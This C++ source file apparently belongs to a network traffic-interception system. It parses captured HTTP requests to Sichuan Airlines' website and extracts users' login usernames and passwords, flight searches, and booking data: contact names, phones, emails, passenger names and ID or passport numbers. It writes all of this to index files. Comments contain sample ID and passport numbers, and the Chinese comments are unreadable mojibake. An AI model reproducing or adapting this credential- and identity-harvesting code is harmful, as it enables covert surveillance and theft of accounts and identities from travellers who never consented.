
#include "StdAfx.h"

#include "PlaneSiChuanAirlines.h"

plane::SiChuanAirlines::SiChuanAirlines(HttpSession *http_session, const string &pro_name) : Airplane(http_session,pro_name)
{
	
}

plane::SiChuanAirlines::~SiChuanAirlines()
{
	
}

//5 ���֤ 6 ����֤ 7 ����֤ 3 ʿ��֤ 15 ����֤ 2 ��Ч���� 14 ����֤��
string plane::SiChuanAirlines::GetIdType(string idType)
{
	string idTypeTrue;
	if (idType == "5"){idTypeTrue = "���֤";}
	if (idType == "6"){idTypeTrue = "����֤";}
	if (idType == "7"){idTypeTrue = "����֤";}
	if (idType == "3"){idTypeTrue = "ʿ��֤";}
	if (idType == "15"){idTypeTrue = "����֤";}
	if (idType == "2"){idTypeTrue = "��Ч����";}
	if (idType == "14"){idTypeTrue = "����֤��";}
	return idTypeTrue;
}

int plane::SiChuanAirlines::IsSiChuanAirlines(HttpSession *http_session)
{
	//��¼
	if((http_session->m_Requestline.m_Host.Find("www.sichuanair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/3uair/ibe/profile/processLogin.do?successPage")!=-1) )
	{
		return kpclogin;
	}
	//�г�Ԥ��-���� ����
	if((http_session->m_Requestline.m_Host.Find("www.sichuanair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/3uair/ibe/common/processSearchForm.do")!=-1))
	{
		return kpcticket;
	}
	//�г�Ԥ��-��Ŀ�ĵ�
	if((http_session->m_Requestline.m_Host.Find("www.sichuanair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/3uair/ibe/common/processSearch.do")!=-1))
	{
		return kpcticket;
	}
	//�ύ����
	if((http_session->m_Requestline.m_Host.Find("www.sichuanair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/3uair/ibe/checkout/processPassengerDetails.do")!=-1))
	{
		return kpcorder;
	}
	return 0;
}

int plane::SiChuanAirlines::Process(const char *packet,int action)
{
	//��¼
	if (action == kpclogin)
	{
		return pclogin(packet);
	}
	//�г�Ԥ��
	if (action == kpcticket)
	{
		return pcticket(packet);
	}
	if (action == kpcorder)
	{
		return pcorder(packet);
	}
	return 1;
}

//��¼
int plane::SiChuanAirlines::pclogin(const char *packet)
{
	string url = http_session_->m_Requestline.m_URI.GetBuffer(0);
    ms_->Replace(url,"?","&");
	url = ms_->UTF8ToGBK(UrlDecode(url));
	ms_->SplitStringToMap(url,"&","=");
	//�û���
	username = ms_->GetValueFromMapByKey("credentials/loginUsername");
	//����
	password = ms_->GetValueFromMapByKey("credentials/loginPassword");

	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + username + "\r\n" + //�˺�
		"pass=" + password + "\r\n" + //����
		"state=��¼\r\n";
	WriteIndexFile();
	return 1;
}

// �г�Ԥ��
int plane::SiChuanAirlines::pcticket(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,'&','=');
	string AirlineType = ms_->GetValueFromMapByKey("Search/flightType",true);
	//����
	if (AirlineType == "oneway")
	{
		adtCount = ms_->GetValueFromMapByKey("Search/Passengers/adults",true);
		chdCount = ms_->GetValueFromMapByKey("Search/Passengers/children",true);
		deptCdTxt = ms_->GetValueFromMapByKey("Search/OriginDestinationInformation/Origin/location_input",true);
		arrCdTxt = ms_->GetValueFromMapByKey("Search/OriginDestinationInformation/Destination/location_input",true);
		deptDt = ms_->GetValueFromMapByKey("Search/DateInformation/departDate",true);
		if (deptCdTxt.empty() || arrCdTxt.empty() || deptDt.empty())
		{
			return 0;
		}
		output_text_ =
			"netmark=" +adtCount + "\r\n" +		//��������   		
			"onick=" + 	chdCount + "\r\n" +		//��ͯ����   
			"nick=" +	deptCdTxt + "\r\n" +	//������
			"msg=" + 	arrCdTxt + "\r\n" +		//Ŀ�ĵ� 
			"servername=" + deptDt + "\r\n" +	//��������
			"state=��ѯ\r\n";
		WriteIndexFile();
	}
	//����
	if (AirlineType == "return")
	{
		adtCount = ms_->GetValueFromMapByKey("Search/Passengers/adults",true);
		chdCount = ms_->GetValueFromMapByKey("Search/Passengers/children",true);
		deptCdTxt = ms_->GetValueFromMapByKey("Search/OriginDestinationInformation/Origin/location_input",true);
		arrCdTxt = ms_->GetValueFromMapByKey("Search/OriginDestinationInformation/Destination/location_input",true);
		deptDt = ms_->GetValueFromMapByKey("Search/DateInformation/departDate",true);
	    deptDtRe = ms_->GetValueFromMapByKey("Search/DateInformation/returnDate",true);
		if (deptCdTxt.empty() || arrCdTxt.empty() || deptDt.empty() || deptDtRe.empty())
		{
			return 0;
		}
		output_text_ =
		"netmark=" +adtCount + "\r\n" +		//��������   		
		"onick=" + 	chdCount + "\r\n" +		//��ͯ����  
		"nick=" +	deptCdTxt + "\r\n" +	//������
		"msg=" + 	arrCdTxt + "\r\n" +		//Ŀ�ĵ� 
		"servername=" + deptDt + "\r\n" +	//��������
		"appname=" + deptDtRe + "\r\n" +	//��������
		"state=��ѯ\r\n";
		WriteIndexFile();
	}
	//��Ŀ�ĵ�
	if (AirlineType == "multi-city")
	{
		//��������
		adtCount = ms_->GetValueFromMapByKey("Search/Passengers/adults",true);
		//��ͯ����
		chdCount = ms_->GetValueFromMapByKey("Search/Passengers/children",true);
		
		//Search/DateInformation$2$/departTime
		//��ȡ���е�����
		int pos = src_data.rfind("DateInformation$") + strlen("DateInformation$");
		int tos = src_data.rfind("$/departDate");
		string passengerCount = src_data.substr(pos,tos - pos);
		int m = atoi(passengerCount.c_str());
		
		for (int i=1;i<=m;i++)
		{		
			CString tem ;
			tem.Format("%d",i);
			string n = tem.GetBuffer(0);	
			//�������� //Search/DateInformation$1$/departDate
			string date1 = "Search/DateInformation$";
			string date2 = "$/departDate";
			string date = date1 + n + date2;
			deptDt = ms_->GetValueFromMapByKey(date,true);
			
			//������ //Search/OriginDestinationInformation/Origin$1$/location_input
			string placedep1 = "Search/OriginDestinationInformation/Origin$";
			string placedep2 = "$/location_input";
			string placedep = placedep1 + n + placedep2;
			deptCdTxt = ms_->GetValueFromMapByKey(placedep,true);
			
			//Ŀ�ĵ� //Search/OriginDestinationInformation/Destination$2$/location_input
			string placearr1 = "Search/OriginDestinationInformation/Destination$";
			string placearr2 = "$/location_input";
			string placearr = placearr1 + n + placearr2;
			arrCdTxt = ms_->GetValueFromMapByKey(placearr,true);
			
			if (deptDt.empty() || deptCdTxt.empty() || arrCdTxt.empty())
			{
				return 0;
			}
			if (deptCdTxt == "ƴ��/����" || arrCdTxt == "ƴ��/����")
			{
				return 0;
			}
			output_text_ =
				"netmark=" + adtCount + "\r\n" +	//��������
				"onick=" + 	chdCount + "\r\n" +		//��ͯ����
				"nick=" + 	deptCdTxt + "\r\n" +	//������
				"msg=" + 	arrCdTxt + "\r\n" +		//Ŀ�ĵ� 		
				"servername=" + deptDt + "\r\n" +	//��������
				"state=��ѯ\r\n";
			WriteIndexFile();
		}	
	}
	return 1;
}
//�ύ����
int plane::SiChuanAirlines::pcorder(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,'&','=');
	//�����ύ����
	if (src_data.find("PersonName/GivenName") == -1)
	{
		//��������
		deptDt = ms_->GetValueFromMapByKey("flightDate",true);
		//��ϵ������
		contactname_ = ms_->GetValueFromMapByKey("Profile/Customer/PersonName/Surname",true);
		//��ϵ�˵绰
		mobile = ms_->GetValueFromMapByKey("Profile/Customer/Telephone$3$/@PhoneNumber",true);
		//��ϵ������
		email = ms_->GetValueFromMapByKey("Profile/Customer/Email",true);
		//product$1000$/passenger$2$/Passport/DocID=E27447195
		//��ȡ�˿͵�����
		int pos = src_data.rfind("product$1000$/passenger$") + strlen("product$1000$/passenger$");
		int tos = src_data.rfind("$/Passport/DocID");
		string passengerCount = src_data.substr(pos,tos - pos);
		int m = atoi(passengerCount.c_str());
		
		for (int i=1;i<=m;i++)
		{		
			CString tem ;
			tem.Format("%d",i);
			string n = tem.GetBuffer(0);	
			//�˿����� product$1000$/passenger$1$/Customer/PersonName/Surname=������
			string name1 = "product$1000$/passenger$";
			string name2 = "$/Customer/PersonName/Surname";
			string name = name1 + n + name2;
			username = ms_->GetValueFromMapByKey(name,true);
			
			//�˿�֤������ product$1000$/passenger$1$/Passport/DocType=5
			string type1 = "product$1000$/passenger$";
			string type2 = "$/Passport/DocType";
			string type = type1 + n + type2;
			idtype_ = ms_->GetValueFromMapByKey(type,true);
			idtype_ = GetIdType(idtype_);
			
			//�˿�֤���� product$1000$/passenger$1$/Passport/DocID=440901197709165291
			string id1 = "product$1000$/passenger$";
			string id2 = "$/Passport/DocID";
			string docid = id1 + n + id2;
			idcard = ms_->GetValueFromMapByKey(docid,true);
			
			if (username.empty() || idcard.empty())
			{
				return 0;
			}
			output_text_ =
				"mid=" + 	contactname_ + "\r\n" + //��ϵ������		 	
				"oid=" + 	mobile + "\r\n" +		//��ϵ�˵绰			
				"imsi=" + 	email + "\r\n" + 		//��ϵ������
				"msgtype=" + username + "\r\n" +	//�˿�����				
				"webname=" + idtype_ + "\r\n" +		//�˿�֤������ 	
				"subject=" + idcard + "\r\n" +		//�˿�֤����	
				"state=�ύ����\r\n";
			WriteIndexFile();
		}
	}
    //�����ύ����
	if (src_data.find("PersonName/GivenName") != -1)
	{
		//��������
		deptDt = ms_->GetValueFromMapByKey("flightDate",true);
		//��ϵ������
		contactname_ = ms_->GetValueFromMapByKey("Profile/Customer/PersonName/Surname",true);
		//��ϵ�˵绰
		mobile = ms_->GetValueFromMapByKey("Profile/Customer/Telephone$3$/@PhoneNumber",true);
		//��ϵ������
		email = ms_->GetValueFromMapByKey("Profile/Customer/Email",true);
		//product$1000$/passenger$2$/CustLoyalty/@ProgramID=FFP
		//��ȡ�˿͵�����
		int pos = src_data.rfind("product$1000$/passenger$") + strlen("product$1000$/passenger$");
		int tos = src_data.rfind("$/CustLoyalty/@ProgramID");
		string passengerCount = src_data.substr(pos,tos - pos);
		int m = atoi(passengerCount.c_str());
		
		for (int i=1;i<=m;i++)
		{		
			CString tem ;
			tem.Format("%d",i);
			string n = tem.GetBuffer(0);	
			//�˿����� product$1000$/passenger$2$/Customer/PersonName/Surname=chen
			//		   product$1000$/passenger$2$/Customer/PersonName/GivenName=zaiming
			string name1 = "product$1000$/passenger$";
			string name2 = "$/Customer/PersonName/Surname";
			string name3 = "$/Customer/PersonName/GivenName";
			string name = name1 + n + name2;
			string givename = name1 + n + name3;
			username = ms_->GetValueFromMapByKey(name,true) + 
					   ms_->GetValueFromMapByKey(givename);	
			//�˿�֤������ 
			idtype_ = GetIdType("2");
			//�˿�֤���� product$1000$/passenger$2$/Passport/DocID=E27447195
			string id1 = "product$1000$/passenger$";
			string id2 = "$/Passport/DocID";
			string docid = id1 + n + id2;
			idcard = ms_->GetValueFromMapByKey(docid,true);
			
			if (username.empty() || idcard.empty())
			{
				return 0;
			}
			output_text_ =
				"mid=" + 	contactname_ + "\r\n" + //��ϵ������		 	
				"oid=" + 	mobile + "\r\n" +		//��ϵ�˵绰			
				"imsi=" + 	email + "\r\n" + 		//��ϵ������
				"msgtype=" + username + "\r\n" +	//�˿�����				
				"webname=" + idtype_ + "\r\n" +		//�˿�֤������ 	
				"subject=" + idcard + "\r\n" +		//�˿�֤����	
				"state=�ύ����\r\n";
			WriteIndexFile();
		}
	}
	return 1;
}
